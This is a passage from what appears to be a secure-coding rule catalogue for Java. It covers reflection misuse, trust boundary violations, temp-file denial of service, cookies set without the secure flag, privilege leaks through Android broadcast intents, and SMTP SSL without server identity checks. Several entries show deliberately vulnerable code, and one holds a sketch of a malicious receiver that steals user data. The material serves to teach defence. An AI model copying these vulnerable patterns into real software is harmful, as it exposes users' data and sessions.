<span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">concurrent</span><span class="o">.</span><span class="na">atomic</span><span class="o">.</span><span class="na">AtomicReferenceFieldUpdater</span><span class="o">.</span><span class="na">newUpdater</span><span class="o">()</span>
</pre></div>
</td></tr></table>
<p>Use of reflection complicates security analysis and can easily introduce security vulnerabilities. Consequently, programmers should avoid using the reflection APIs when it is feasible to do so. Exercise extreme caution when the use of reflection is necessary.</p>
<p>In particular, reflection must not be used to provide access to classes, methods, and fields unless those items are already accessible without the use of reflection. For example, the use of reflection to access or modify fields is not allowed unless those fields are already accessible and modifiable by other means, such as through getter and setter methods.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>To ensure that the security manager will block attempts to access private fields of other classes, never grant the permission ReflectPermission with action suppressAccessChecks.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>In this vulnerable code example, the private fields i and j can be modified using reflection via a Field object:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FieldExample</span> <span class="o">{</span>
  <span class="kd">private</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">3</span><span class="o">;</span>
  <span class="kd">private</span> <span class="kt">int</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">4</span><span class="o">;</span>

  <span class="kd">public</span> <span class="n">String</span> <span class="nf">toString</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">return</span> <span class="s">"FieldExample: i="</span> <span class="o">+</span> <span class="n">i</span> <span class="o">+</span> <span class="s">", j="</span> <span class="o">+</span> <span class="n">j</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroI</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroField</span><span class="o">(</span><span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="k">this</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="n">fieldName</span><span class="o">);</span>
      <span class="c1">// Subsequent access to field f passes language access checks</span>
      <span class="c1">// because zeroField() could have accessed the field via</span>
      <span class="c1">// ordinary field references</span>
      <span class="n">f</span><span class="o">.</span><span class="na">setInt</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="mi">0</span><span class="o">);</span>
      <span class="c1">// Log appropriately or throw sanitized exception; see EXC06-J</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NoSuchFieldException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Report to handler</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IllegalAccessException</span> <span class="n">ex</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Report to handler</span>
    <span class="o">}</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">FieldExample</span> <span class="n">fe</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FieldExample</span><span class="o">();</span>
    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">fe</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="k">for</span> <span class="o">(</span><span class="n">String</span> <span class="n">arg</span> <span class="o">:</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">fe</span><span class="o">.</span><span class="na">zeroField</span><span class="o">(</span><span class="n">arg</span><span class="o">);</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">fe</span><span class="o">.</span><span class="na">toString</span><span class="o">());</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<p>When you must use reflection, make sure that the immediate caller (method) is isolated from hostile code by declaring it private or final, as in this compliant solution:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FieldExample</span> <span class="o">{</span>
  <span class="c1">// ...</span>

  <span class="kd">private</span> <span class="kt">void</span> <span class="nf">zeroField</span><span class="o">(</span><span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// ...</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>When a class must use reflection to provide access to fields, it must also provide the same access using a nonreflection interface:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">FieldExample</span> <span class="o">{</span>
  <span class="c1">// ...</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroField</span><span class="o">(</span><span class="n">String</span> <span class="n">fieldName</span><span class="o">)</span> <span class="o">{</span>
    <span class="c1">// ...</span>
  <span class="o">}</span>

  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroI</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="o">}</span>
  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">zeroJ</span><span class="o">()</span> <span class="o">{</span>
    <span class="k">this</span><span class="o">.</span><span class="na">j</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert">
<p>https://wiki.sei.cmu.edu/confluence/display/java/SEC05-J.+Do+not+use+reflection+to+increase+accessibility+of+classes%2C+methods%2C+or+fields <a class="footnote-backref" href="#fnref-cert" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1091">Trust Boundary Violation</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>A trust boundary can be thought of as line drawn through a program. On one side of the line, data is untrusted. On the other side of the line, data is assumed to be trustworthy. The purpose of validation logic is to allow data to safely cross the trust boundary - to move from untrusted to trusted. A trust boundary violation occurs when a program blurs the line between what is trusted and what is untrusted. By combining trusted and untrusted data in the same data structure, it becomes easier for programmers to mistakenly trust unvalidated data.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Without well-established and maintained trust boundaries, programmers will inevitably lose track of which pieces of data have been validated and which have not. This confusion will eventually allow some data to be used without first being validated.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<p>Establish and respect trust boundaries.</p>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>The following code accepts an HTTP request and stores the username parameter in the HTTP session object before checking to ensure that the user has been authenticated.</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">usrname</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="na">getParameter</span><span class="o">(</span><span class="s">"usrname"</span><span class="o">);</span>
<span class="k">if</span> <span class="o">(</span><span class="n">session</span><span class="o">.</span><span class="na">getAttribute</span><span class="o">(</span><span class="n">ATTR_USR</span><span class="o">)</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
  <span class="n">session</span><span class="o">.</span><span class="na">setAttribute</span><span class="o">(</span><span class="n">ATTR_USR</span><span class="o">,</span> <span class="n">usrname</span><span class="o">);</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe">
<p>https://cwe.mitre.org/data/definitions/501.html <a class="footnote-backref" href="#fnref-cwe" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1071">Denial of Service</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/input-validation-and-representation.html">Input validation and representation</a>

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a><ul>
<li><a href="#denial-of-service-through-resource-exhaustion">Denial of Service Through Resource Exhaustion</a></li>
<li><a href="#concurrency-related-denial-of-service">Concurrency-Related Denial of Service</a></li>
</ul>
</li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
<li><a href="#fixed-code-example">Fixed Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Denial-of-service (DoS) attacks attempt to make a computer resource unavailable or insufficiently available to its intended users. Distributed denial-of-service (DDoS) attacks are launched by two or more persons or bots. DoS and DDoS attacks are generally of greater concern for persistent, server-type systems than for desktop applications; nevertheless, denial of service issues can arise for all classes of application</p>
<p>There are several methods of causing a denial of service:
- Vulnerability attacks involve sending a few well-crafted packets that take advantage of an existing vulnerability in the target machine.
- Resource exhaustion attacks that consume computational resource such as bandwidth, memory, disk space, or processor time.
- Algorithmic attacks (such as on hash functions) by injecting values that force worst-case conditions to exist.
- Bandwidth consumption attacks that consume all available network bandwidth of the victim.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<h4 id="denial-of-service-through-resource-exhaustion">Denial of Service Through Resource Exhaustion</h4>
<p>Denial of service can occur when resource usage is disproportionately large in comparison to the input data that causes the resource usage. Checking inputs for excessive resource consumption may be unjustified for client software that expects the user to handle resource-related problems. Even such client software, however, should check for inputs that could cause persistent denial of service, such as filling up the file system.</p>
<h4 id="concurrency-related-denial-of-service">Concurrency-Related Denial of Service</h4>
<p>Some denial of service attacks operate by attempting to induce concurrency-related problems such as thread deadlock, thread starvation, and race conditions.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>Remove temporary files before termination</li>
<li>Do not synchronize on objects that may be reused</li>
<li>Do not allow untrusted code to terminate the JVM</li>
<li>Do not allow exceptions to expose sensitive information</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">TempFile</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span><span class="o">{</span>
    <span class="n">File</span> <span class="n">f</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"tempnam.tmp"</span><span class="o">);</span>
    <span class="k">if</span> <span class="o">(</span><span class="n">f</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"This file already exists"</span><span class="o">);</span>
      <span class="k">return</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="n">FileOutputStream</span> <span class="n">fop</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">fop</span> <span class="o">=</span> <span class="k">new</span> <span class="n">FileOutputStream</span><span class="o">(</span><span class="n">f</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">str</span> <span class="o">=</span> <span class="s">"Data"</span><span class="o">;</span>
      <span class="n">fop</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">str</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
    <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="k">if</span> <span class="o">(</span><span class="n">fop</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
          <span class="n">fop</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
          <span class="c1">// Handle error</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>This Vulnerable code example fails to remove the file upon completion.</p>
<h3 id="fixed-code-example">Fixed Code Example</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">class</span> <span class="nc">TempFile</span> <span class="o">{</span>
  <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Path</span> <span class="n">tempFile</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">tempFile</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">createTempFile</span><span class="o">(</span><span class="s">"tempnam"</span><span class="o">,</span> <span class="s">".tmp"</span><span class="o">);</span>
      <span class="k">try</span> <span class="o">(</span><span class="n">BufferedWriter</span> <span class="n">writer</span> <span class="o">=</span>
          <span class="n">Files</span><span class="o">.</span><span class="na">newBufferedWriter</span><span class="o">(</span><span class="n">tempFile</span><span class="o">,</span> <span class="n">Charset</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"UTF8"</span><span class="o">),</span>
                                  <span class="n">StandardOpenOption</span><span class="o">.</span><span class="na">DELETE_ON_CLOSE</span><span class="o">))</span> <span class="o">{</span>
        <span class="c1">// Write to file</span>
      <span class="o">}</span>
      <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Temporary file write done, file erased"</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">FileAlreadyExistsException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"File exists: "</span> <span class="o">+</span> <span class="n">tempFile</span><span class="o">);</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">x</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Some other sort of failure, such as permissions.</span>
      <span class="n">System</span><span class="o">.</span><span class="na">err</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Error creating temporary file: "</span> <span class="o">+</span> <span class="n">x</span><span class="o">);</span>
    <span class="o">}</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cert1">
<p>https://wiki.sei.cmu.edu/confluence/display/java/Denial+of+Service <a class="footnote-backref" href="#fnref-cert1" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-cert2">
<p>https://wiki.sei.cmu.edu/confluence/display/java/FIO03-J.+Remove+temporary+files+before+termination <a class="footnote-backref" href="#fnref-cert2" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1109">Insecure Storage</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>The software does not encrypt sensitive or critical information before storage or transmission.</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>Clearly specify which data or resources are valuable enough that they should be protected by encryption. </li>
<li>Ensure that encryption is properly integrated into the system design.</li>
<li>Identify the separate needs and contexts for encryption.</li>
<li>When using industry-approved techniques, use them correctly.</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable code Example</h3>
<p>The snippet of code below, taken from a servlet doPost() method, sets an accountID cookie (sensitive) without calling setSecure(true).</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Cookie</span> <span class="n">c</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Cookie</span><span class="o">(</span><span class="n">ACCOUNT_ID</span><span class="o">,</span> <span class="n">acctID</span><span class="o">);</span>
<span class="n">response</span><span class="o">.</span><span class="na">addCookie</span><span class="o">(</span><span class="n">c</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-cwe1">
<p>https://cwe.mitre.org/data/definitions/614.html <a class="footnote-backref" href="#fnref-cwe1" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-cwe2">
<p>https://cwe.mitre.org/data/definitions/311.html <a class="footnote-backref" href="#fnref-cwe2" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/privacy leakage.html">Privacy leakage</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7389">Class extends Struts Action class and uses instance variables</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/privacy-leakage.html">Privacy leakage</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Class extends Struts Action class and uses instance variables</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
    This class extends from a Struts Action class, and uses an instance member variable. Since only
    one instance of a struts Action class is created by the Struts framework, and used in a
    multithreaded way, this paradigm is highly discouraged and most likely problematic. Consider
    only using method local variables. Only instance fields that are written outside of a monitor
    are reported.
    </p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>high</p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-bugs.html">FIND-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE1090">Privilege Management</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#potential-mitigations">Potential Mitigations</a></li>
<li><a href="#demonstrative-examples">Demonstrative Examples</a><ul>
<li><a href="#vulnerable-code-example">Vulnerable Code Example</a></li>
</ul>
</li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Creating an dangerous sphere of control for that actor, because application incorrectly assigns a privilege to a particular actor or assigns a privilege based on unknown source. </p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p>Improper privilege management can result in untrusted, unprivileged code performing unintended privileged operations. However, carefully restricting privileges adds complexity. This added complexity and the associated reduction of maintainability must be traded off against any security improvement.</p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>Medium</p>
<h1 id="potential-mitigations">Potential Mitigations</h1>
<ul>
<li>
<p>Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.</p>
</li>
<li>
<p>Run your code using the lowest privileges that are required to accomplish the necessary tasks.</p>
</li>
</ul>
<h1 id="demonstrative-examples">Demonstrative Examples</h1>
<h3 id="vulnerable-code-example">Vulnerable Code Example</h3>
<p>This application sends a special intent with a flag that allows the receiving application to read a data file for backup purposes:</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Intent</span><span class="o">();</span>
<span class="n">intent</span><span class="o">.</span><span class="na">setAction</span><span class="o">(</span><span class="s">"com.example.BackupUserData"</span><span class="o">);</span>
<span class="n">intent</span><span class="o">.</span><span class="na">setData</span><span class="o">(</span><span class="n">file_uri</span><span class="o">);</span>
<span class="n">intent</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="n">FLAG_GRANT_READ_URI_PERMISSION</span><span class="o">);</span>
<span class="n">sendBroadcast</span><span class="o">(</span><span class="n">intent</span><span class="o">);</span>
</pre></div>
</td></tr></table>
<p>Any malicious application can register to receive this intent. Because of the FLAG_GRANT_READ_URI_PERMISSION included with the intent, the malicious receiver code can read the user's data：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">CallReceiver</span> <span class="kd">extends</span> <span class="n">BroadcastReceiver</span> <span class="o">{</span>
  <span class="nd">@Override</span>
  <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onReceive</span><span class="o">(</span><span class="n">Context</span> <span class="n">context</span><span class="o">,</span> <span class="n">Intent</span> <span class="n">intent</span><span class="o">)</span> <span class="o">{</span>
    <span class="n">Uri</span> <span class="n">userData</span> <span class="o">=</span> <span class="n">intent</span><span class="o">.</span><span class="na">getData</span><span class="o">();</span>
    <span class="n">stealUserData</span><span class="o">(</span><span class="n">userData</span><span class="o">);</span>
  <span class="o">}</span>
<span class="o">}</span>
</pre></div>
</td></tr></table>
<h1 id="references">References</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE264">
<p>https://cwe.mitre.org/data/definitions/264.html <a class="footnote-backref" href="#fnref-CWE264" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP-A6">
<p>https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration <a class="footnote-backref" href="#fnref-OWASP-A6" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/security policy management.html">Security policy management</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE7474">Insecure SMTP SSL connection</h1>
                <p>
                    Posted on September 28, 2024 in <a href="../../category/security-policy-management.html">Security policy management</a>

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#description">Description</a></li>
<li><a href="#vulnerability-and-risk">Vulnerability and risk</a></li>
<li><a href="#likelihood-of-exploit">Likelihood of Exploit</a></li>
<li><a href="#references">References</a></li>
</ul>
</div>

            <div>
                
<h1 id="description">Description</h1>
<p>Insecure SMTP SSL connection</p>
<h1 id="vulnerability-and-risk">Vulnerability and risk</h1>
<p><p>
Server identity verification is disabled when making SSL connections. Some email libraries that enable SSL connections do not verify the server certificate by default. This is equivalent to trusting all certificates. When trying to connect to the server, this application would readily accept a certificate issued to "hackedserver.com". The application would now potentially leak sensitive user information on a broken SSL connection to the hacked server.
</p>
<p>
<b>Vulnerable Code:</b><br/>
<pre>...
Email email = new SimpleEmail();
email.setHostName("smtp.servermail.com");
email.setSmtpPort(465);
email.setAuthenticator(new DefaultAuthenticator(username, password));
email.setSSLOnConnect(true);
email.setFrom("user@gmail.com");
email.setSubject("TestMail");
email.setMsg("This is a test mail ... :-)");
email.addTo("foo@bar.com");
email.send();
...</pre>
</p>
<p>
<b>Solution:</b><br/>
Please add the following check to verify the server cerfiticate:
<pre>email.setSSLCheckServerIdentity(true);</pre>
</p></p>
<h1 id="likelihood-of-exploit">Likelihood of Exploit</h1>
<p>medium</p>
<h1 id="references">References</h1>
<p><a href="https://cwe.mitre.org/data/definitions/297.html">CWE-297: Improper Validation of Certificate with Host Mismatch</a><br/></p>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../tag/java.html">JAVA</a>
                <a href="../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../standard/java.html">java</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues.html">Security issues</a>
                    </li>
                    <li>
                            <a href="../../subcategory/java/security issues/input validation and representation.html">Input validation and representation</a>
                    </li>
                </ol>
                
                </div>

